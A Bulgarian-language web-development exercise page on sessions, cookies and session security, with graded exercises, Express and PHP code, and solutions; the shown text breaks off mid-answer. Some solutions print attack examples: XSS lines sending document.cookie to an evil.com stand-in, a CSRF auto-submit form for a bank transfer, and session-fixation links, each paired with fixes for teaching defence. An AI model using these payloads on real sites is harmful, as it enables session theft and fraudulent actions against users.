---
sidebar_position: 2
title: "Упражнения"
tags: [exercises, practice, web-sessions, cookies, security]
---

import ExerciseCard from '@site/src/components/Exercise/ExerciseCard';
import ProgressTracker from '@site/src/components/Exercise/ProgressTracker';
import CollapsibleSection from '@site/src/components/CollapsibleSection';
import InfoBox from '@site/src/components/InfoBoxes/InfoBox';
import WarningBox from '@site/src/components/InfoBoxes/WarningBox';
import SuccessBox from '@site/src/components/InfoBoxes/SuccessBox';
import useBaseUrl from '@docusaurus/useBaseUrl';

# Упражнения: Уеб Сесии

<img src={useBaseUrl('/img/diagrams/sessions/exercises-header.svg')} alt="Exercises Header" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<ProgressTracker />

---

## Лесни Упражнения (EASY)

<ExerciseCard difficulty="easy">

### HTTP Statelessness Обяснение

Какво означава, че HTTP е "stateless"? Обяснете със собствени думи защо това създава проблем за уеб приложенията.

<CollapsibleSection title="💡 Подсказка">

Помислете какво се случва между две последователни HTTP заявки - помни ли сървърът нещо от предишната заявка?

</CollapsibleSection>

<CollapsibleSection title="✅ Решение">

**HTTP е stateless** означава, че всяка HTTP заявка се третира като напълно независима транзакция. Сървърът няма вградена "памет" за предишни заявки от същия клиент.

**Защо е проблем:**
- Кошницата би се изпразвала при всяко ново зареждане на страница
- Потребителите би трябвало да се логват отново за всяко действие
- Многостъпкови формуляри не биха могли да запазят данни между стъпките
- Персонализацията би била невъзможна

Сесиите решават този проблем като добавят механизъм за "запомняне" на сървъра.

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="easy">

### Къде се Съхраняват Session Данните

Къде се съхраняват session данните?

A) Само в браузъра на потребителя
B) На сървъра
C) В URL параметрите
D) В самата HTML страница

<CollapsibleSection title="✅ Решение">

**Правилен отговор: B) На сървъра**

Session данните се съхраняват на сървъра. В браузъра се съхранява само **Session ID** (обикновено в cookie), който сървърът използва за намиране на съответните данни.

Това е ключова разлика между cookies и sessions:
- **Cookies:** Данните са в браузъра
- **Sessions:** Данните са на сървъра, само ID е в браузъра

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="easy">

### Попълване на Празните Места

Попълнете празните места:

Уеб сесията използва уникален __________ за свързване на браузъра на потребителя с данните, съхранявани на __________. Този идентификатор обикновено се предава чрез __________.

<CollapsibleSection title="✅ Решение">

Уеб сесията използва уникален **Session ID** за свързване на браузъра на потребителя с данните, съхранявани на **сървъра**. Този идентификатор обикновено се предава чрез **cookie**.

**Допълнително:**
- Session ID е дълъг, случаен низ (напр. `PHPSESSID=abcdef123456`)
- Cookie-то често е маркирано като `HttpOnly` за сигурност
- Алтернативно (по-рядко) ID може да се предава чрез URL параметри

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="easy">

### Реални Примери за Сесии

Изброете три реални примера за уеб функционалности, които разчитат на сесии за правилна работа.

<CollapsibleSection title="✅ Решение">

**Три основни примера:**

1. **Кошници за пазаруване** - Запазват избраните продукти докато навигирате между страници и до момента на плащане

2. **Потребителски логин** - Поддържат автентикирания статус, така че не се налага да въвеждате парола на всяка страница

3. **Многостъпкови формуляри** - Запазват въведените данни през различните стъпки на регистрация или анкета

**Други примери:**
- Запазване на предпочитания за език/тема
- "Наскоро разгледани" продукти
- Wizard интерфейси (конфигуратори)
- Online banking транзакции

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="easy">

### Вярно или Грешно: Cookies и Sessions

Вярно или Грешно: Cookies и sessions са едно и също нещо.

Обяснете отговора си в 1-2 изречения.

<CollapsibleSection title="✅ Решение">

**Грешно.**

Cookies и sessions са различни механизми:
- **Cookies** съхраняват данни директно в браузъра (client-side)
- **Sessions** съхраняват данни на сървъра (server-side), а браузърът пази само Session ID

Sessions често **използват** cookie за транспортиране на Session ID, но това не ги прави еднакви. Cookie-то е само "превозното средство" за ID-то, докато реалните session данни са на сървъра.

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="easy">

### Съпоставяне на Термини

Съпоставете всеки термин с правилното описание:

| Термин | Описание |
|--------|----------|
| 1. Session ID | A) Малки данни, съхранявани в браузъра |
| 2. Cookie | B) Server-side структура от данни, свързана с потребител |
| 3. Session data | C) Уникален идентификатор, предаван между клиент и сървър |

<CollapsibleSection title="✅ Решение">

| Термин | Описание |
|--------|----------|
| **1. Session ID** | **C)** Уникален идентификатор, предаван между клиент и сървър |
| **2. Cookie** | **A)** Малки данни, съхранявани в браузъра |
| **3. Session data** | **B)** Server-side структура от данни, свързана с потребител |

**Обяснение:**
- Session ID е "ключът", който свързва браузъра със session данните на сървъра
- Cookie е client-side механизъм за съхранение (включително на Session ID)
- Session data са фактическите данни за потребителя, съхранявани на сървъра

</CollapsibleSection>

</ExerciseCard>

---

## Средни Упражнения (MEDIUM)

<ExerciseCard difficulty="medium">

### Сравнение Cookies vs Sessions

Сравнете cookies и sessions като попълните таблицата:

| Аспект | Cookies | Sessions |
|--------|---------|----------|
| Местоположение | | |
| Ниво на сигурност | | |
| Ограничения на размера | | |
| Най-добро приложение | | |

<CollapsibleSection title="✅ Решение">

| Аспект | Cookies | Sessions |
|--------|---------|----------|
| **Местоположение** | Браузър (client-side) | Сървър (server-side), само ID в cookie |
| **Ниво на сигурност** | По-ниско - видими и редактируеми от потребителя | По-високо - данните са скрити от клиента |
| **Ограничения на размера** | ~4KB максимум | Практически неограничен (server memory) |
| **Най-добро приложение** | Предпочитания, теми, non-sensitive tracking | Login status, кошници, чувствителни данни |

**Ключови разлики:**
- Sessions са по-сигурни за чувствителни данни
- Cookies са по-лесни за имплементация на прости функционалности
- Sessions изискват сървърни ресурси, cookies - не

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### Четирите Етапа на Жизнения Цикъл

Опишете четирите основни етапа от жизнения цикъл на уеб сесия в правилния ред. За всеки етап напишете едно изречение, обясняващо какво се случва.

<CollapsibleSection title="✅ Решение">

**1. Създаване (Creation)**
Когато потребител първо взаимодейства с приложението, сървърът генерира уникален Session ID, създава съответна структура за данни и изпраща ID-то на браузъра чрез cookie.

**2. Активна Употреба (Active Use)**
При всяка следваща заявка браузърът изпраща Session ID, сървърът извлича асоциираните данни, приложението чете/пише в тях, и цикълът продължава.

**3. Timeout (Неактивност)**
Ако потребителят остане неактивен за конфигуриран период (обикновено 20-30 минути), сесията автоматично се инвалидира за освобождаване на ресурси и намаляване на рисковете за сигурност.

**4. Унищожаване (Destruction)**
Сесията се унищожава изрично при logout (`session_destroy()`) или при server-side cleanup на изтекли сесии, като Session ID става невалиден.

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### PHP Session Counter

Даден е следният PHP код. Какво ще се покаже при третото посещение на страницата в рамките на една сесия?

```php
<?php
session_start();
if (!isset($_SESSION['counter'])) {
    $_SESSION['counter'] = 0;
}
$_SESSION['counter']++;
echo "Visit number: " . $_SESSION['counter'];
?>
```

<CollapsibleSection title="💡 Подсказка">

Проследете стойността на `$_SESSION['counter']` при всяко посещение:
- Първо посещение: counter не съществува → инициализира се на 0 → увеличава се
- Второ посещение: counter вече съществува с предишната стойност...

</CollapsibleSection>

<CollapsibleSection title="✅ Решение">

**Изход: `Visit number: 3`**

**Обяснение стъпка по стъпка:**

**Първо посещение:**
- `session_start()` започва нова сесия
- `$_SESSION['counter']` не съществува → задава се на 0
- Увеличава се на 1
- Показва: "Visit number: 1"

**Второ посещение:**
- `session_start()` възстановява съществуващата сесия
- `$_SESSION['counter']` вече е 1 (от предишното посещение)
- Условието `!isset()` е `false` → не се инициализира
- Увеличава се на 2
- Показва: "Visit number: 2"

**Трето посещение:**
- `$_SESSION['counter']` е 2
- Увеличава се на 3
- Показва: **"Visit number: 3"**

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### Express.js Session Имплементация

Изграждате просто Express.js приложение. Напишете код, който:
1. Настройва express-session middleware
2. Създава route, който съхранява любимия цвят на потребителя в сесията
3. Създава route, който показва съхранения любим цвят

<CollapsibleSection title="💡 Подсказка">

Използвайте:
- `app.use(session({...}))` за middleware
- `req.session.favoriteColor` за съхранение
- Query параметър или body за получаване на цвета

</CollapsibleSection>

<CollapsibleSection title="✅ Решение">

```javascript
const express = require('express');
const session = require('express-session');
const app = express();

// 1. Настройка на express-session middleware
app.use(session({
  secret: 'my_secret_key_change_in_production',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: false,  // true за production с HTTPS
    maxAge: 3600000 // 1 час
  }
}));

// Middleware за парсване на JSON body
app.use(express.json());

// 2. Route за съхранение на любим цвят
// POST /color с body: { "color": "blue" }
app.post('/color', (req, res) => {
  const { color } = req.body;
  if (!color) {
    return res.status(400).json({ error: 'Color is required' });
  }
  req.session.favoriteColor = color;
  res.json({ message: `Favorite color set to ${color}` });
});

// Алтернативно: GET /color/set?color=blue
app.get('/color/set', (req, res) => {
  const { color } = req.query;
  if (!color) {
    return res.status(400).send('Please provide a color: /color/set?color=blue');
  }
  req.session.favoriteColor = color;
  res.send(`Your favorite color has been set to: ${color}`);
});

// 3. Route за показване на съхранения цвят
app.get('/color', (req, res) => {
  const color = req.session.favoriteColor;
  if (color) {
    res.json({ favoriteColor: color });
  } else {
    res.json({ message: 'No favorite color set yet' });
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

**Тестване:**
```bash
# Задаване на цвят
curl -X POST http://localhost:3000/color \
  -H "Content-Type: application/json" \
  -d '{"color": "blue"}' \
  -c cookies.txt

# Или чрез GET
curl "http://localhost:3000/color/set?color=red" -c cookies.txt

# Получаване на цвят (използвайки същите cookies)
curl http://localhost:3000/color -b cookies.txt
```

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### Session Timeout Сценарий

Потребител добавя 3 артикула в кошницата на e-commerce сайт, след това затваря браузъра и го отваря отново 45 минути по-късно (session timeout е 30 минути). Какво се случва с кошницата? Обяснете защо, като се позовете на жизнения цикъл на сесията.

<CollapsibleSection title="✅ Решение">

**Какво се случва: Кошницата е празна (загубена).**

**Обяснение чрез жизнения цикъл:**

1. **При добавяне на артикули:**
   - Сървърът съхранява артикулите в session данните
   - Session ID cookie се изпраща на браузъра

2. **След 30 минути неактивност:**
   - Сесията **изтича** на сървъра (timeout етап)
   - Session данните (включително кошницата) се **унищожават**
   - Server-side cleanup процес премахва изтеклите сесии

3. **При повторно отваряне след 45 мин:**
   - Браузърът може все още да има Session ID cookie
   - Но сървърът вече **няма** данни за този ID
   - Сървърът третира потребителя като **нов** посетител
   - Създава се нова, **празна** сесия

**Защо е така:**
- Sessions са "time-bound" - имат ограничен живот
- Timeout предпазва от натрупване на неактивни сесии
- Намалява рискове за сигурност (стари session ID-та)
- Освобождава сървърни ресурси

**Решения в практиката:**
- Запис на кошница в база данни за логнати потребители
- `localStorage` backup за гост потребители
- Подкана за създаване на акаунт преди timeout

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### Session Fixation Атака

Обяснете какво е "session fixation атака" и опишете основната мярка, която разработчиците трябва да имплементират за предотвратяването ѝ.

<CollapsibleSection title="✅ Решение">

**Session Fixation атака:**

Атака, при която злонамерен потребител **принуждава** жертвата да използва предварително известен Session ID, след което изчаква жертвата да се логне с този ID.

**Сценарий на атаката:**
1. Атакуващият създава сесия и получава Session ID (напр. `abc123`)
2. Изпраща линк на жертвата със зададен Session ID: `http://site.com/login?sessionid=abc123`
3. Жертвата кликва линка и се логва
4. Сега атакуващият има достъп до логнатата сесия, защото знае Session ID

**Основна мярка: Регенерация на Session ID**

```javascript
// Express.js
app.post('/login', (req, res) => {
  // Валидирай credentials...
  if (validCredentials) {
    // КРИТИЧНО: Регенерирай Session ID след успешен login
    req.session.regenerate(err => {
      if (err) return res.status(500).send('Error');
      req.session.user = { id: userId, name: userName };
      res.redirect('/dashboard');
    });
  }
});
```

```php
// PHP
session_start();
if ($validLogin) {
    // Регенерирай ID и унищожи стария
    session_regenerate_id(true);
    $_SESSION['user'] = $userData;
}
```

**Защо работи:**
- Старият (потенциално компрометиран) ID става невалиден
- Генерира се нов, неизвестен за атакуващия ID
- Атакуващият вече не може да използва познатия ID

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="medium">

### HttpOnly Cookie Атрибут

Кой cookie атрибут предотвратява JavaScript достъп до session cookie?

A) `Secure`
B) `SameSite`
C) `HttpOnly`
D) `MaxAge`

Обяснете защо този атрибут е важен за сигурността на сесиите.

<CollapsibleSection title="✅ Решение">

**Правилен отговор: C) HttpOnly**

**Защо е важен:**

`HttpOnly` атрибутът предотвратява достъп до cookie чрез JavaScript (`document.cookie`). Това е критична защита срещу **Cross-Site Scripting (XSS)** атаки.

**Сценарий без HttpOnly:**
1. Сайтът има XSS уязвимост
2. Атакуващият инжектира: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
3. Session cookie се изпраща на атакуващия
4. Атакуващият може да използва откраднатия Session ID

**С HttpOnly:**
- `document.cookie` **не** връща HttpOnly cookies
- Дори при XSS уязвимост, Session ID не може да бъде откраднат чрез JavaScript
- Cookie се изпраща само с HTTP заявки към сървъра

**Настройка:**
```javascript
// Express
cookie: { httpOnly: true, secure: true }

// PHP
session_set_cookie_params(['httponly' => true]);
```

**Други атрибути:**
- `Secure` - изпраща cookie само през HTTPS
- `SameSite` - защита от CSRF
- `MaxAge` - продължителност на cookie (не е за сигурност)

</CollapsibleSection>

</ExerciseCard>

---

## Трудни Упражнения (HARD)

<ExerciseCard difficulty="hard">

### Multi-Step Registration Wizard

Проектирате многостъпков регистрационен формуляр с 4 страници (Лична информация → Адрес → Предпочитания → Потвърждение). Напишете псевдокод или реален код (на предпочитан език), показващ:
- Как session данните се съхраняват на всяка стъпка
- Как се обработва навигация назад към предишна стъпка
- Как се обработват всички данни при финалното изпращане

<CollapsibleSection title="💡 Подсказка">

Структурирайте session данните в обект/масив като `req.session.registration`:
```javascript
req.session.registration = {
  step1: { name, email },
  step2: { address, city },
  step3: { preferences },
  currentStep: 2
}
```

</CollapsibleSection>

<CollapsibleSection title="✅ Решение">

````javascript
const express = require('express');
const session = require('express-session');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'registration_wizard_secret',
  resave: false,
  saveUninitialized: true
}));

// Helper: Инициализиране на registration данни
const initRegistration = (req) => {
  if (!req.session.registration) {
    req.session.registration = {
      personalInfo: {},
      address: {},
      preferences: {},
      currentStep: 1,
      completed: false
    };
  }
  return req.session.registration;
};

// СТЪПКА 1: Лична информация
app.get('/register/step1', (req, res) => {
  const reg = initRegistration(req);
  // Pre-fill с existing данни ако има
  res.render('step1', { data: reg.personalInfo });
});

app.post('/register/step1', (req, res) => {
  const reg = initRegistration(req);
  const { name, email, phone } = req.body;

  // Валидация
  if (!name || !email) {
    return res.render('step1', {
      data: { name, email, phone },
      error: 'Name and email are required'
    });
  }

  // Съхраняване в сесията
  reg.personalInfo = { name, email, phone };
  reg.currentStep = Math.max(reg.currentStep, 2);

  res.redirect('/register/step2');
});

// СТЪПКА 2: Адрес
app.get('/register/step2', (req, res) => {
  const reg = initRegistration(req);

  // Защита: не позволявай skip на стъпки
  if (!reg.personalInfo.name) {
    return res.redirect('/register/step1');
  }

  res.render('step2', { data: reg.address });
});

app.post('/register/step2', (req, res) => {
  const reg = initRegistration(req);
  const { street, city, postalCode, country } = req.body;

  // Валидация
  if (!city || !country) {
    return res.render('step2', {
      data: { street, city, postalCode, country },
      error: 'City and country are required'
    });
  }

  reg.address = { street, city, postalCode, country };
  reg.currentStep = Math.max(reg.currentStep, 3);

  res.redirect('/register/step3');
});

// СТЪПКА 3: Предпочитания
app.get('/register/step3', (req, res) => {
  const reg = initRegistration(req);

  if (!reg.address.city) {
    return res.redirect('/register/step2');
  }

  res.render('step3', { data: reg.preferences });
});

app.post('/register/step3', (req, res) => {
  const reg = initRegistration(req);
  const { newsletter, theme, language } = req.body;

  reg.preferences = {
    newsletter: newsletter === 'on',
    theme: theme || 'light',
    language: language || 'bg'
  };
  reg.currentStep = Math.max(reg.currentStep, 4);

  res.redirect('/register/confirm');
});

// СТЪПКА 4: Потвърждение
app.get('/register/confirm', (req, res) => {
  const reg = initRegistration(req);

  if (!reg.preferences.language) {
    return res.redirect('/register/step3');
  }

  // Показване на всички данни за преглед
  res.render('confirm', {
    personalInfo: reg.personalInfo,
    address: reg.address,
    preferences: reg.preferences
  });
});

// ФИНАЛНО ИЗПРАЩАНЕ
app.post('/register/submit', async (req, res) => {
  const reg = initRegistration(req);

  // Финална валидация
  if (!reg.personalInfo.name || !reg.address.city) {
    return res.redirect('/register/step1');
  }

  try {
    // Събиране на всички данни
    const userData = {
      ...reg.personalInfo,
      ...reg.address,
      ...reg.preferences,
      registeredAt: new Date()
    };

    // Запис в база данни
    // await User.create(userData);
    console.log('User registered:', userData);

    // Изчистване на registration данни
    delete req.session.registration;

    // Регенерация на session ID (security)
    req.session.regenerate(err => {
      if (err) console.error(err);
      req.session.successMessage = 'Registration complete!';
      res.redirect('/register/success');
    });

  } catch (error) {
    res.render('confirm', { error: 'Registration failed' });
  }
});

// НАВИГАЦИЯ НАЗАД - работи автоматично!
// Тъй като данните са в сесията, GET routes ги показват
app.get('/register/back/:step', (req, res) => {
  res.redirect(`/register/step${req.params.step}`);
});
````

**Ключови моменти:**
- Всяка стъпка съхранява данните си в сесията
- Навигация назад работи защото данните persist
- Step guards предотвратяват skip на стъпки
- Финалното submit изчиства registration данните
- Session regeneration след успешна регистрация

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Scalability с 100K Concurrent Users

Вашето уеб приложение изпитва проблеми с производителността при мащабиране до 100,000 едновременни потребители. Текущата имплементация съхранява сесии в паметта на сървъра.

A) Идентифицирайте защо това е проблемно в multi-server среда
B) Предложете решение с централизиран session store
C) Скицирайте архитектурата, показваща как заявките преминават между load balancer, web servers и session store

<CollapsibleSection title="✅ Решение">

**A) Проблеми с in-memory sessions в multi-server среда:**

1. **Session Affinity проблем:**
   - Потребител прави заявка → Server A създава сесия
   - Следваща заявка → Load balancer я праща на Server B
   - Server B **няма** тази сесия → потребителят е "изгубен"

2. **Memory limits:**
   - 100K потребители × ~1KB session data = ~100MB на сървър
   - Ако имаме 5 сървъра с репликация = 500MB per server
   - Memory pressure, garbage collection паузи

3. **Server failure:**
   - Ако Server A падне, всички сесии на него се губят
   - Няма persistence

4. **Scaling difficulty:**
   - Добавяне на нов сървър изисква синхронизация на сесии
   - Репликацията е скъпа и бавна

**B) Решение: Централизиран Session Store (Redis)**

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const Redis = require('ioredis');

// Redis клиент с cluster support
const redisClient = new Redis({
  host: 'redis-cluster.example.com',
  port: 6379,
  password: process.env.REDIS_PASSWORD,
  // Cluster mode за high availability
  // cluster: [{ host: 'node1', port: 6379 }, ...]
});

const app = express();

app.use(session({
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',
    ttl: 1800  // 30 минути в секунди
  }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    maxAge: 1800000
  }
}));
```

**Предимства:**
- Всички web servers достъпват **една и съща** session store
- Няма нужда от sticky sessions
- Redis е in-memory → бърз достъп
- Redis поддържа clustering и replication
- Automatic TTL/expiration
- Horizontal scaling на web servers без синхронизация

**C) Архитектурна диаграма:**

```
                        ┌─────────────────┐
                        │   Потребители   │
                        └────────┬────────┘
                                 │
                                 ▼
                        ┌─────────────────┐
                        │  Load Balancer  │
                        │  (Round Robin)  │
                        └────────┬────────┘
                                 │
           ┌─────────────────────┼─────────────────────┐
           │                     │                     │
           ▼                     ▼                     ▼
    ┌─────────────┐       ┌─────────────┐       ┌─────────────┐
    │  Web Server │       │  Web Server │       │  Web Server │
    │     A       │       │     B       │       │     C       │
    │ (Stateless) │       │ (Stateless) │       │ (Stateless) │
    └──────┬──────┘       └──────┬──────┘       └──────┬──────┘
           │                     │                     │
           └─────────────────────┼─────────────────────┘
                                 │
                                 ▼
                        ┌─────────────────┐
                        │  Redis Cluster  │
                        │  Session Store  │
                        │ (Primary + Replicas) │
                        └─────────────────┘

Request Flow:
1. User → Load Balancer
2. LB → Any Web Server (no sticky sessions needed)
3. Web Server → Redis: GET session by ID
4. Redis → Web Server: Session data
5. Web Server processes request
6. Web Server → Redis: UPDATE session (if changed)
7. Web Server → User: Response
```

**Допълнителни considerations:**
- Redis Sentinel за automatic failover
- Read replicas за по-добър read throughput
- Connection pooling към Redis
- Graceful degradation при Redis недостъпност

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Security Audit на Session Config

Анализирайте следната Express.js session конфигурация и идентифицирайте ВСИЧКИ проблеми със сигурността. За всеки проблем обяснете уязвимостта, която създава, и как да се поправи:

```javascript
app.use(session({
  secret: 'password123',
  resave: true,
  saveUninitialized: true,
  cookie: {
    secure: false,
    maxAge: 86400000 * 30
  }
}));
```

<CollapsibleSection title="✅ Решение">

**Проблем 1: Слаб secret**
```javascript
secret: 'password123'  // ❌ УЯЗВИМОСТ
```
- **Уязвимост:** Лесен за отгатване secret позволява на атакуващ да forge/tamper session cookies
- **Атака:** Session token forgery
- **Поправка:**
```javascript
secret: process.env.SESSION_SECRET  // Дълъг, случаен низ от env variable
// Генериране: require('crypto').randomBytes(64).toString('hex')
```

---

**Проблем 2: secure: false**
```javascript
cookie: { secure: false }  // ❌ УЯЗВИМОСТ
```
- **Уязвимост:** Session cookie се изпраща и през HTTP (некриптирано)
- **Атака:** Man-in-the-middle (MITM) - снифиране на Session ID в public Wi-Fi
- **Поправка:**
```javascript
cookie: { secure: true }  // Само през HTTPS
// Или динамично:
cookie: { secure: process.env.NODE_ENV === 'production' }
```

---

**Проблем 3: Липсва httpOnly**
```javascript
cookie: { /* няма httpOnly */ }  // ❌ УЯЗВИМОСТ
```
- **Уязвимост:** JavaScript може да достъпва cookie чрез `document.cookie`
- **Атака:** XSS атаки могат да откраднат Session ID
- **Поправка:**
```javascript
cookie: { httpOnly: true }
```

---

**Проблем 4: Липсва sameSite**
```javascript
cookie: { /* няма sameSite */ }  // ❌ УЯЗВИМОСТ
```
- **Уязвимост:** Cookie се изпраща при cross-site заявки
- **Атака:** CSRF (Cross-Site Request Forgery)
- **Поправка:**
```javascript
cookie: { sameSite: 'strict' }  // или 'lax' за по-flexible
```

---

**Проблем 5: Прекалено дълъг maxAge**
```javascript
maxAge: 86400000 * 30  // 30 дни! ❌ УЯЗВИМОСТ
```
- **Уязвимост:** Сесията остава валидна твърде дълго
- **Атака:** По-голям прозорец за session hijacking; изоставен браузър в public место
- **Поправка:**
```javascript
maxAge: 1800000  // 30 минути за чувствителни приложения
// или 86400000 (1 ден) за по-малко критични
```

---

**Проблем 6: saveUninitialized: true**
```javascript
saveUninitialized: true  // ⚠️ Потенциален проблем
```
- **Проблем:** Създава сесия за всеки посетител, включително ботове
- **Последици:** Session store bloat, потенциални compliance issues (GDPR - tracking без consent)
- **Поправка:**
```javascript
saveUninitialized: false  // Създавай сесия само когато има данни за запис
```

---

**Проблем 7: resave: true**
```javascript
resave: true  // ⚠️ Performance issue
```
- **Проблем:** Записва сесията при всяка заявка дори ако не е променена
- **Последици:** Излишни write операции към session store, race conditions
- **Поправка:**
```javascript
resave: false
```

---

**Коректна конфигурация:**
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Промени default name
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 1800000  // 30 минути
  },
  store: new RedisStore({ client: redisClient })  // Production store
}));
```

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Sessions vs JWT Сравнение

Сравнете традиционните server-side сесии с JSON Web Tokens (JWT) за автентикация:

| Критерий | Server-Side Sessions | JWT |
|----------|---------------------|-----|
| Къде се съхранява състоянието | | |
| Implications за scalability | | |
| Как се обработва logout | | |
| Съображения за сигурност | | |

Кога бихте избрали sessions пред JWT и обратно?

<CollapsibleSection title="✅ Решение">

| Критерий | Server-Side Sessions | JWT |
|----------|---------------------|-----|
| **Къде се съхранява състоянието** | На сървъра (Redis, memory, DB). Клиентът има само Session ID | В самия токен (client-side). Сървърът е stateless |
| **Implications за scalability** | Изисква shared session store за multi-server. Допълнителен infrastructure component | Истински stateless - всеки сървър може да валидира токена независимо. По-лесно хоризонтално мащабиране |
| **Как се обработва logout** | Лесно - унищожи сесията на сървъра. Instant invalidation | Сложно - токенът остава валиден до изтичане. Нужна е blacklist или кратки expiration times |
| **Съображения за сигурност** | Session ID може да бъде hijacked ако е exposed. Сървърът контролира данните | Токенът съдържа payload - не слагай sensitive data. XSS може да открадне токен от localStorage. Larger attack surface за token manipulation |

---

**Кога да изберем Sessions:**

1. **Нужда от instant logout/revocation**
   - Банкови приложения, финансови услуги
   - Admin панели с високо ниво на сигурност

2. **Sensitive data в session**
   - Когато не искате data exposure в токена
   - Сложни user permissions, ролеви модели

3. **Традиционни MPA (Multi-Page Applications)**
   - Server-rendered сайтове
   - Вече имате session infrastructure

4. **По-проста security модел**
   - Централизиран контрол над сесиите
   - По-лесен audit trail

---

**Кога да изберем JWT:**

1. **Микросървисна архитектура**
   - Много независими сървиси
   - Нужда от stateless authentication между services

2. **Mobile applications**
   - Native apps с API backend
   - Offline capability нужди

3. **Third-party API достъп**
   - OAuth/OpenID Connect сценарии
   - API tokens за external consumers

4. **Extreme scalability нужди**
   - Милиони потребители
   - Искате да избегнете session store bottleneck

5. **Single Sign-On (SSO)**
   - Споделяне на auth между домейни/приложения

---

**Hybrid подход (най-добрите от двата света):**

```javascript
// Short-lived JWT за API автентикация
// + Server-side refresh token store за revocation

const accessToken = jwt.sign(
  { userId, role },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }  // Кратък живот
);

// Refresh token в secure, httpOnly cookie
// съхранен в Redis за възможност за revocation
const refreshToken = generateSecureToken();
await redis.set(`refresh:${userId}`, refreshToken, 'EX', 7 * 24 * 60 * 60);
```

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Security Vulnerability Audit

**Сценарий:** Правите одит на session имплементацията на уеб приложение. По време на прегледа откривате:
- Сесиите се предават през HTTP (не HTTPS)
- Session ID не се регенерира след login
- Session cookie-то няма `HttpOnly` и `SameSite` атрибути
- Сесиите никога не изтичат

За всяка уязвимост:
1. Назовете специфичната атака, която тя позволява
2. Опишете как атакуващ би могъл да я експлоатира
3. Предоставете специфичната поправка в код или конфигурация

<CollapsibleSection title="✅ Решение">

**Уязвимост 1: HTTP вместо HTTPS**

1. **Атака:** Man-in-the-Middle (MITM) Session Hijacking
2. **Експлоатация:**
   - Атакуващият е в същата мрежа (кафене, public Wi-Fi)
   - Използва packet sniffer (Wireshark, tcpdump)
   - Улавя HTTP traffic и извлича Session ID от cookie header
   - Използва Session ID в собствения си браузър
3. **Поправка:**
```javascript
// Express
app.use(session({
  cookie: { secure: true }  // Cookie само през HTTPS
}));

// Принуди HTTPS redirect
app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
});

// Nginx config
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

---

**Уязвимост 2: Без Session ID регенерация**

1. **Атака:** Session Fixation
2. **Експлоатация:**
   - Атакуващият посещава сайта, получава Session ID: `abc123`
   - Изпраща phishing email на жертвата с линк:
     `http://site.com/login?SESSIONID=abc123`
   - Жертвата кликва, логва се - но използва ID, известен на атакуващия
   - Атакуващият вече има достъп до логнатата сесия
3. **Поправка:**
```javascript
// Express - регенерирай ID след login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    req.session.regenerate(err => {  // Нов Session ID!
      if (err) return res.status(500).send('Error');
      req.session.user = user;
      res.redirect('/dashboard');
    });
  }
});

// PHP
session_start();
if ($validLogin) {
    session_regenerate_id(true);  // true = изтрий стария session
    $_SESSION['user'] = $userData;
}
```

---

**Уязвимост 3: Липсва HttpOnly**

1. **Атака:** Cross-Site Scripting (XSS) Session Theft
2. **Експлоатация:**
   - Сайтът има XSS уязвимост (напр. несанитизиран user input)
   - Атакуващият инжектира:
     ```html
     <script>
     new Image().src = 'https://evil.com/steal?c=' + document.cookie;
     </script>
     ```
   - Когато жертва посети страницата, скриптът изпраща cookies на атакуващия
   - Атакуващият използва Session ID за impersonation
3. **Поправка:**
```javascript
// Express
app.use(session({
  cookie: { httpOnly: true }  // JavaScript не може да чете cookie
}));

// PHP
ini_set('session.cookie_httponly', 1);
// или
session_set_cookie_params(['httponly' => true]);
```

---

**Уязвимост 4: Липсва SameSite**

1. **Атака:** Cross-Site Request Forgery (CSRF)
2. **Експлоатация:**
   - Жертвата е логната в bank.com
   - Посещава злонамерен сайт evil.com със скрит form:
     ```html
     <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker-account">
       <input type="hidden" name="amount" value="10000">
     </form>
     <script>document.forms[0].submit();</script>
     ```
   - Браузърът изпраща заявката С валидния session cookie
   - Банката обработва transfer заявката като легитимна
3. **Поправка:**
```javascript
// Express
app.use(session({
  cookie: {
    sameSite: 'strict'  // Cookie не се изпраща при cross-site requests
    // или 'lax' за по-balance между security и usability
  }
}));

// Допълнително: CSRF tokens
const csrf = require('csurf');
app.use(csrf());
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
```

---

**Уязвимост 5: Сесии без expiration**

1. **Атака:** Persistent Session Hijacking / Stale Session Abuse
2. **Експлоатация:**
